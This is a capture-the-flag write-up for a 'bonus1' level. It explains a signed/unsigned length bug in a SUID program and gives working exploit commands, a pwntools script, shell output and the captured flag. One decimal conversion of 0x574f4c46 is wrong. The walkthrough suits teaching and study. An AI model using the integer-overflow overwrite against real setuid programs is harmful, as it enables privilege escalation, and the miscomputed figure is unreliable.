# Bonus 1

Same recon as level0: SUID **bonus2**. No return-address hijack, no shellcode here. The whole exploit is flipping one integer the program never expects you to control.

## Analysis

```c
int main(int argc, char **argv) {
    char buf[40];
    int n = atoi(argv[1]);
    if (n < 10) {                          // signed check
        memcpy(buf, argv[2], n * 4);       // size = n*4, cast to size_t (unsigned)
        if (n == 0x574f4c46)               // "FLOW" little-endian
            execl("/bin/sh", "sh", 0);
        return 0;
    }
    return 1;
}
```

Read it head-on and it looks safe: to reach `execl` you need `n < 10` **and** `n == 0x574f4c46` (1,464,816,710). No integer is both less than 10 and over a billion, so the shell should be unreachable. Try both edges directly:

```
$ ./bonus1 10 AAAA
$ echo $?
1                        # n=10 fails "n < 10", returns 1, no memcpy at all
$ ./bonus1 5 AAAA
$ echo $?
0                        # n=5 passes "n < 10", memcpy runs, but n != 0x574f4c46, no shell
```

So the door really is locked, both bolts have to open together and they look mutually exclusive. The bug is that the two checks don't look at `n` in the same way:

> **Signed/unsigned size mismatch.** `if (n < 10)` compares `n` as a **signed** int, so any negative number passes it (negative is always less than 10). But `memcpy(buf, argv[2], n * 4)` expects its third argument as `size_t`, an **unsigned** type. `n * 4` is computed in 32-bit arithmetic and then reinterpreted as unsigned, so a large negative `n` turns into a small, perfectly reasonable-looking copy length. The `n < 10` gate and the `memcpy` length are the same variable, but one reads it as signed and the other as unsigned; that gap is the whole vulnerability.

`disas main` shows exactly this:

```
mov    0x3c(%esp),%eax
lea    0x0(,%eax,4),%ecx     ; ecx = n * 4  (plain 32-bit multiply, no sign extension trickery)
...
mov    %ecx,0x8(%esp)        ; memcpy's 3rd arg = n * 4
...
mov    %eax,(%esp)           ; memcpy's 1st arg = buf, at esp+0x14
...
call   memcpy
cmpl   $0x574f4c46,0x3c(%esp)  ; n compared against "FLOW", still the same slot
```

`n` itself lives at `esp+0x3c`, `buf` at `esp+0x14`. Distance: `0x3c - 0x14 = 0x28` = **40 bytes**, exactly `buf`'s declared size. So if we can get `memcpy` to copy 44 bytes instead of a small legitimate amount, the last 4 of those bytes land exactly on `n`, right after `buf`, letting us overwrite `n` with whatever we want, after the signed check has already passed.

### Choosing a value for `n`

We need one integer `n` that reads as negative (so `n < 10` passes) and, when multiplied by 4, gives `memcpy` a copy length of exactly 44 (40 bytes of padding to fill `buf`, plus 4 to reach `n`).

The catch: `n` is a 32-bit `int`. `n * 4` is computed with ordinary 32-bit multiplication, the same instruction the CPU always uses, so if the true mathematical product doesn't fit in 32 bits, the high bits are simply thrown away and only the low 32 bits survive. That silent truncation is what "`(n * 4) mod 2^32`" means: it's not abstract math notation, it is a literal description of what the multiply instruction leaves in the register. The obvious, non-overflowing answer is `n = 11`, since `11 * 4 = 44` exactly, no truncation involved. The problem is `11` is positive, so it fails `n < 10`.

We need a *different* `n` whose product also truncates down to 44, but that reads as negative. Here's the trick: add `2^30` (1,073,741,824) to `n`. Multiplying by 4 turns that `+2^30` into `+2^32` on the product, and adding exactly `2^32` to a 32-bit value is invisible; it overflows the register exactly once and lands back on the same low 32 bits it started with. So `n = 11`, `n = 11 + 2^30`, `n = 11 + 2*2^30`, and `n = 11 + 3*2^30` all multiply out to the same visible 44, they only differ in the part that gets discarded:

```
$ python -c "
for k in range(4):
    n = 11 + k*(1<<30)
    signed = n - (1<<32) if n & 0x80000000 else n
    print k, hex(n), signed, (n*4) % (1<<32)
"
0 0xb          11            44
1 0x4000000b   1073741835    44
2 0x8000000b   -2147483637   44
3 0xc000000b   -1073741813   44
```

All four give `n*4 mod 2^32 = 44`, exactly what we need, but only `k=2` and `k=3` are negative, so only those two also satisfy `n < 10`. Either works; there is nothing special about picking one over the other. We use `k=3`: `n = 0xC000000B`, which as a signed 32-bit int is **-1073741813**.

## Exploit

```bash
$ ./bonus1 -1073741813 $(python -c 'print "A"*40 + "FLOW"')
id
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

`memcpy` writes 40 `A`s into `buf`, then the last 4 bytes of `argv[2]`, `"FLOW"`, land exactly on `n`. `n` is now `0x574f4c46`, the equality check passes, and `execl` runs a shell as bonus2. The other candidate from the table, `k=2`, works the same way:

```bash
$ ./bonus1 -2147483637 $(python -c 'print "A"*40 + "FLOW"')
id
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
```

Flag: `579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`

## Alternative: pwntools

There's no offset or address to pack here, so pwntools mainly buys tidier argument handling and one small trick, reading `"FLOW"` as the 32-bit value we need instead of taking the comment's word for it:

```python
from pwn import *
context.arch = 'i386'

print(hex(u32(b'FLOW')))   # 0x574f4c46, same value as the source comment, computed instead of asserted

n = -1073741813
payload = b'A' * 40 + b'FLOW'
io = process(['./bonus1', str(n), payload])
io.interactive()
```

The actual vulnerability, the signed/unsigned mismatch and the search for a negative `n` that truncates to 44, is a logic bug in the program, not a byte-formatting problem, so no tool finds it for you. pwntools would not have shortened the reasoning in "Choosing a value for `n`" above at all.

